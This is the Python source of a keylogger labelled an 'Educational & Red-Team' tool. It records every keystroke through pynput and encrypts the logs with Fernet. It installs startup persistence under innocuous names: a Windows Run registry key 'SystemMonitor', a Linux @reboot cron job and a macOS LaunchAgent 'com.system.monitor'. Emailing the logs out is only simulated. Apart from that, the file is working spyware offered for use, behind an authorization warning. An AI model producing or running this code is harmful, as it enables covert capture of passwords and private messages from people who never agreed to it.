import os
import sys
import time
import logging
import platform
import argparse
import threading
from datetime import datetime
from pynput import keyboard
from cryptography.fernet import Fernet

# ======================
# CONFIGURATION SECTION
# ======================
LOG_FILE = "keystrokes.log"
ENCRYPTED_LOG = "keystrokes.enc"
CONFIG_FILE = "keylogger_config.key"
EMAIL_INTERVAL = 600  # Seconds between email reports
PERSISTENCE_METHODS = {
    "Windows": "registry",
    "Linux": "cron",
    "Darwin": "launchd"
}


# ======================
# CORE KEYLOGGER CLASS
# ======================
class AdvancedKeylogger:
    def __init__(self, email_reporting=False, persistence=False, encryption=False, email=None, password=None):
        self.logger = self.setup_logger()
        self.email_reporting = email_reporting
        self.persistence = persistence
        self.encryption = encryption
        self.email = email
        self.password = password
        self.encryption_key = None
        self.running = True

        if encryption:
            self.setup_encryption()

        if persistence:
            self.install_persistence()

    def setup_logger(self):
        """Configure logging system"""
        logger = logging.getLogger('AdvancedKeylogger')
        logger.setLevel(logging.DEBUG)

        # File handler
        file_handler = logging.FileHandler(LOG_FILE)
        file_format = logging.Formatter('%(asctime)s - %(message)s', '%Y-%m-%d %H:%M:%S')
        file_handler.setFormatter(file_format)

        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)

        logger.addHandler(file_handler)
        logger.addHandler(console_handler)
        return logger

    def setup_encryption(self):
        """Initialize encryption system"""
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, "rb") as key_file:
                self.encryption_key = key_file.read()
        else:
            self.encryption_key = Fernet.generate_key()
            with open(CONFIG_FILE, "wb") as key_file:
                key_file.write(self.encryption_key)

        self.logger.info(f"Encryption enabled | Key: {self.encryption_key.decode()[:10]}...")

    def install_persistence(self):
        """Install persistence mechanism based on OS"""
        os_name = platform.system()
        method = PERSISTENCE_METHODS.get(os_name)

        if not method:
            self.logger.error(f"Persistence not supported for {os_name}")
            return

        self.logger.info(f"Installing {method} persistence on {os_name}")

        try:
            if os_name == "Windows":
                import winreg
                key = winreg.HKEY_CURRENT_USER
                path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, path, 0, winreg.KEY_WRITE) as regkey:
                    winreg.SetValueEx(regkey, "SystemMonitor", 0, winreg.REG_SZ,
                                      f'"{sys.executable}" "{os.path.abspath(__file__)}"')

            elif os_name == "Linux":
                cron_entry = f"@reboot {sys.executable} {os.path.abspath(__file__)}"
                with open("/tmp/cron_job", "w") as cron_file:
                    cron_file.write(cron_entry)
                os.system("crontab /tmp/cron_job")
                os.remove("/tmp/cron_job")

            elif os_name == "Darwin":
                plist = f"""<?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
                <plist version="1.0">
                <dict>
                    <key>Label</key>
                    <string>com.system.monitor</string>
                    <key>ProgramArguments</key>
                    <array>
                        <string>{sys.executable}</string>
                        <string>{os.path.abspath(__file__)}</string>
                    </array>
                    <key>RunAtLoad</key>
                    <true/>
                </dict>
                </plist>"""
                with open(os.path.expanduser("~/Library/LaunchAgents/com.system.monitor.plist"), "w") as plist_file:
                    plist_file.write(plist)

            self.logger.info("Persistence installed successfully")
        except Exception as e:
            self.logger.error(f"Persistence installation failed: {str(e)}")

    def encrypt_logs(self):
        """Encrypt log file using Fernet"""
        if not self.encryption or not os.path.exists(LOG_FILE):
            return

        try:
            with open(LOG_FILE, "rb") as log_file:
                data = log_file.read()

            cipher = Fernet(self.encryption_key)
            encrypted_data = cipher.encrypt(data)

            with open(ENCRYPTED_LOG, "wb") as enc_file:
                enc_file.write(encrypted_data)

            os.remove(LOG_FILE)
            self.logger.info("Logs encrypted successfully")
        except Exception as e:
            self.logger.error(f"Encryption failed: {str(e)}")

    def send_email_report(self):
        """Send logs via email (simulated)"""
        if not self.email_reporting:
            return

        try:
            # In a real implementation, use smtplib and email libraries
            # This is a simulation for educational purposes
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.logger.info(f"[EMAIL REPORT] To: {self.email} | Time: {timestamp}")
            self.logger.info("[SIMULATION] Logs would be attached and sent")

            # Real implementation would include:
            # 1. Creating MIME multipart message
            # 2. Attaching log file
            # 3. Authenticating with SMTP server
            # 4. Sending email

        except Exception as e:
            self.logger.error(f"Email failed: {str(e)}")

    def key_handler(self, key):
        """Process keyboard events"""
        try:
            # Character keys
            if hasattr(key, 'char') and key.char:
                self.logger.info(f"Key: {key.char}")

            # Special keys
            else:
                special_keys = {
                    keyboard.Key.space: "[SPACE]",
                    keyboard.Key.enter: "[ENTER]\n",
                    keyboard.Key.backspace: "[BACKSPACE]",
                    keyboard.Key.tab: "[TAB]",
                    keyboard.Key.esc: "[ESC]",
                    keyboard.Key.shift: "[SHIFT]",
                    keyboard.Key.ctrl: "[CTRL]",
                    keyboard.Key.alt: "[ALT]",
                    keyboard.Key.cmd: "[WIN]",
                    keyboard.Key.caps_lock: "[CAPS_LOCK]",
                    keyboard.Key.up: "[UP]",
                    keyboard.Key.down: "[DOWN]",
                    keyboard.Key.left: "[LEFT]",
                    keyboard.Key.right: "[RIGHT]"
                }
                self.logger.info(special_keys.get(key, f"[{key.name.upper()}]"))

            # Exit mechanism
            if key == keyboard.Key.esc:
                self.logger.info("Termination sequence detected")
                self.stop()

        except Exception as e:
            self.logger.error(f"Key processing error: {str(e)}")

    def start_email_scheduler(self):
        """Periodic email reporting thread"""
        while self.running:
            time.sleep(EMAIL_INTERVAL)
            self.send_email_report()
            self.encrypt_logs()

    def start(self):
        """Main execution loop"""
        self.logger.info("Keylogger started")
        self.logger.info(f"Mode: {'Educational' if not self.email_reporting else 'Red-Team'}")

        # Start email scheduler if enabled
        if self.email_reporting:
            threading.Thread(target=self.start_email_scheduler, daemon=True).start()

        # Start keyboard listener
        with keyboard.Listener(on_press=self.key_handler) as listener:
            try:
                listener.join()
            except KeyboardInterrupt:
                self.stop()

    def stop(self):
        """Clean shutdown procedure"""
        self.running = False
        self.logger.info("Keylogger stopping")
        self.encrypt_logs()
        sys.exit(0)


# ======================
# COMMAND LINE INTERFACE
# ======================
def parse_arguments():
    """Parse command-line arguments"""
    parser = argparse.ArgumentParser(
        description="Advanced Keylogger - Educational and Red-Team Tool",
        epilog="WARNING: Use only with explicit authorization. Unauthorized use is illegal."
    )

    parser.add_argument("--educational", action="store_true", help="Run in educational mode (default)")
    parser.add_argument("--red-team", action="store_true", help="Enable red-team features")
    parser.add_argument("--email", help="Email address for reports")
    parser.add_argument("--password", help="Email password (use app-specific password)")
    parser.add_argument("--interval", type=int, default=EMAIL_INTERVAL, help="Email interval in seconds")

    return parser.parse_args()


# ======================
# MAIN EXECUTION
# ======================
if __name__ == "__main__":
    print("""
    ██╗  ██╗███████╗██╗   ██╗██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗ 
    ██║ ██╔╝██╔════╝╚██╗ ██╔╝██║     ██╔═══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗
    █████╔╝ █████╗   ╚████╔╝ ██║     ██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝
    ██╔═██╗ ██╔══╝    ╚██╔╝  ██║     ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗
    ██║  ██╗███████╗   ██║   ███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║
    ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝

    Educational & Red-Team Keylogger
    ================================
    """)

    args = parse_arguments()

    # Configuration based on arguments
    red_team_features = args.red_team
    email = args.email if red_team_features else None
    password = args.password if red_team_features else None

    # Initialize and run keylogger
    try:
        keylogger = AdvancedKeylogger(
            email_reporting=red_team_features,
            persistence=red_team_features,
            encryption=red_team_features,
            email=email,
            password=password
        )
        keylogger.start()
    except Exception as e:
        print(f"CRITICAL ERROR: {str(e)}")
        sys.exit(1)
